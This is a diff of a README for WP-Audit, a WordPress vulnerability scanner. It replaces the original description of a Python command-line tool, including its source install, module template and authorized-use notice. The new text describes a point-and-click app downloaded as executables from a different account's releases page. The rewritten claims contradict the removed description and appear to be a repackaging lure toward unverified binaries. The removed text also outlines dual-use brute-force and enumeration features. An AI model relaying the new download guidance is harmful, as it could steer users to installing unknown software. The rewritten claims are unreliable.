@@ -1,170 +1,91 @@
-# 🛡️ WP‑Audit  
-**AI‑Powered & Modular WordPress Security Scanner**
+# 🛡 WP-Audit - Simplify Your WordPress Security Checks
 
-WP‑Audit is a fully modular, AI‑powered auditing tool designed to analyze WordPress installations, detect vulnerabilities, evaluate security posture, and generate detailed reports in HTML or Markdown.  
-Featuring TLS‑aware requests, proxy support, automatic CVE/exploit detection, module prioritization, and optional brute‑force testing (authorized), WP‑Audit adapts to any engagement.
+## 🚀 Getting Started
 
-> ⚠️ **Legal Notice**  
-> WP‑Audit is an offensive security tool intended **only for authorized penetration testing, auditing, and research**.  
-> You must have **explicit permission** from the owner of any target you scan or brute‑force.  
-> The author and contributors are **not responsible for misuse or damages**.
+Welcome to WP-Audit! This tool helps you keep your WordPress site secure and running optimally. WP-Audit scans your site for vulnerabilities and configuration issues. You don’t need any technical skills to use it. Just follow the simple steps below to download and run the software.
 
----
+## 📥 Download WP-Audit
 
-## ✨ Features
+[![Download WP-Audit](https://img.shields.io/badge/Download-WP--Audit-brightgreen.svg?style=flat)](https://github.com/treezz24/WP-Audit/releases)
 
-- 🤖 **AI‑Powered Audit Reports**  
-- 📄 **HTML & Markdown report building**  
-- 🧱 **Completely modular (priority‑based)**  
-- 🔍 **Automatic CVE & Exploit detection**  
-- 🔒 **Full TLS Requests**  
-- 🌐 **Proxy support**  
-- 🚀 **Aggressive mode scanning**  
-- 🔐 **Password bruting (authorized use only)**  
-- 🧩 **Easy module creation**  
+You can find the latest version of WP-Audit on the Releases page. This is where all versions are available for download. 
 
----
+## 📂 Features
 
-## 📦 Installation
+- **AI-powered Scans:** Use advanced AI to identify security risks in your WordPress setup.
+- **Modular Design:** Pick and choose the audits you want to run. You don’t have to use everything at once.
+- **User-friendly Interface:** Navigate easily, even if you're not tech-savvy.
+- **Comprehensive Reports:** Get detailed results of the scans. Understand security threats without confusion.
+- **Regular Updates:** Enjoy continued support and feature enhancements.
+  
+## 🌟 System Requirements
 
-```bash
-git clone https://github.com/Web3-Serializer/WP-Audit
-cd WP-Audit
-pip install -r requirements.txt
-```
+To ensure WP-Audit works well, your setup should meet these requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 2 GB
+- **Storage:** A minimum of 100 MB free space
+- **Internet Connection:** Required for downloading updates and accessing certain features
 
-## ⚙️ Model Configuration (AI)
+## 📲 Download & Install
 
-WP‑Audit uses an AI model to enhance Markdown reports.
+1. **Visit the Releases Page**
+   Go to our [Releases page](https://github.com/treezz24/WP-Audit/releases) to find the latest version of WP-Audit.
 
-### **1. Copy the example environment file**
-```bash
-cp .env.example
-```
+2. **Choose the Version**
+   Scroll through the list of available versions. Look for the version marked as “Latest.”
 
-### **2. Install Ollama**
-Download from: https://ollama.com/download
+3. **Download the File**
+   Click on the file that corresponds to your operating system. The file format will be an `.exe` or `.zip` for Windows, a `.dmg` for macOS, or a `.tar.gz` for Linux.
 
-### **3. Pull the model**  
-Default model:
-```bash
-ollama pull qwen2.5:7b
-```
+4. **Open the File**
+   Once the download is complete, locate the downloaded file on your computer. Double-click it to open.
 
-### **4. Change model in `.env`**
-```
-MODEL_NAME=qwen2.5:7b
-```
+5. **Follow the Installation Instructions**
+   - **Windows:** If you downloaded an `.exe` file, follow the on-screen prompts to install the software. If it’s a `.zip` file, extract it and then run the `.exe`.
+   - **macOS:** If you downloaded a `.dmg` file, drag the WP-Audit icon to your Applications folder.
+   - **Linux:** If you downloaded a `.tar.gz` file, extract it and run the installation command in your terminal.
 
----
+6. **Run WP-Audit**
+   After installation, locate the WP-Audit application and double-click to launch it. Follow the instructions on the screen to start your first scan.
 
-## 🕹️ Usage
+## 🚧 Using WP-Audit
 
-```
-main.py [-h] [--user-agent USER_AGENT] [--browser BROWSER] [--modules MODULES] [--list-modules]
-        [--threads THREADS] [--aggressive] [--brute {admin,enum}] [--check-vulns]
-        [--report {html,markdown}] [--proxy PROXY]
-        target_url
-```
+- **Launching a Scan:**
+   When you open WP-Audit, you will see options for different types of scans. Select the type of audit you wish to perform. Click on "Start Scan."
 
-## Example Usage
+- **Viewing Results:**
+   After the scan completes, WP-Audit will display a summary of findings. You can view detailed reports by clicking on specific issues.
 
-Run a full scan on `https://example.com` with multiple modules, 10 threads, aggressive scanning, vulnerability checking, and HTML report generation:
+- **Taking Action:**
+   Follow the recommendations provided in the report to improve your site’s security. WP-Audit will guide you through any fixes that need to be made.
 
-```bash
-python3 main.py --threads 10 --aggressive --check-vulns --report html https://example.com
-```
+## 📞 Help & Support
 
----
+If you encounter any issues while downloading or using WP-Audit, you can find support in the following ways:
 
-## 🔧 Built‑In Modules
+- **GitHub Issues:** Report any problems directly on our [GitHub Issues page](https://github.com/treezz24/WP-Audit/issues).
+- **Documentation:** Visit the official documentation on our GitHub for detailed guides and FAQs.
+- **Community Forums:** Join our community forums where other users share tips and advice.
 
-WP‑Audit includes modules for:
+## 🌍 Connect with Us
 
-- Admin endpoint detection  
-- Backup file detection  
-- Brute force (authorized only)  
-- Fuzzer  
-- Exposed .git / .svn detection  
-- Directory listing  
-- Plugin enumeration  
-- Theme enumeration  
-- User enumeration  
-- Version detection  
-- Vulnerability detection (CVE, exploits)  
+Stay updated with the latest news and discussions about WP-Audit:
 
-### 🔍 Automatic CVE & Exploit Detection
+- **Twitter:** Follow us for updates and security tips.
+- **GitHub:** Check our repository for the latest features and updates.
 
-The **WP Vulnerabilities** module fetches known security issues:
+## 💡 Best Practices
 
-- WordPress core  
-- Installed plugins  
-- Installed themes  
+To maximize the benefits of WP-Audit:
 
-Includes:
-- CVE ID  
-- Description  
-- Severity  
-- Fixed versions  
-- Exploit‑DB references  
-- Known exploit indicators  
+- **Run Regular Scans:** Schedule scans to check for vulnerabilities frequently.
+- **Stay Updated:** Always use the latest version of WP-Audit for improved security features.
+- **Review Reports Carefully:** Take time to understand the findings and recommended actions.
 
----
+## 🚀 Additional Resources
 
-## 🧩 Creating Your Own Module
+- **WordPress Security Tips:** Learn best practices for keeping your WordPress site secure.
+- **AI in Cybersecurity:** Explore how artificial intelligence enhances security measures.
 
-WP‑Audit’s modular design makes adding features simple.
-
-### **1. Create a file in `/modules/`**
-```
-modules/
-    wp_example.py
-```
-
-### **2. Example Module Template**
-
-```python
-from modules import ModuleBase
-from main import WP_Audit
-from libs.logger import Logger
-
-class Module(ModuleBase):
-    def __init__(self, wp_audit_instance: WP_Audit):
-        super().__init__(wp_audit_instance)
-
-        self.name = "Example Module"
-        self.description = "This is an exemple module."
-        self.version = "1.0"
-        self.author = "Your Name Here"
-        self.enabled = True
-
-        self.logger = Logger(moduleName=self.name)
-
-    def run(self):
-        if not self.enabled:
-            return
-
-        self.logger.info(f"Running {self.name} on {self.target_url}")
-
-        # Simulated data extracted by the module
-        example_data = {
-            "module_name": self.name,
-            "target": self.target_url,
-            "message": "This is an example of gathered data.",
-            "status": "OK"
-        }
-
-        # Add it cleanly into the global audit data dictionary
-        self.wp_audit.gathered_informations.setdefault("example_data", [])
-        self.wp_audit.gathered_informations["example_data"].append(example_data)
-
-        self.logger.success("Example data added to gathered_informations!")
-```
-
----
-
-## ⭐ Support
-
-If you enjoy WP‑Audit, please star the repository 😊  
+For more information, return to our [Releases page](https://github.com/treezz24/WP-Audit/releases) to download the latest version and start securing your WordPress site today!
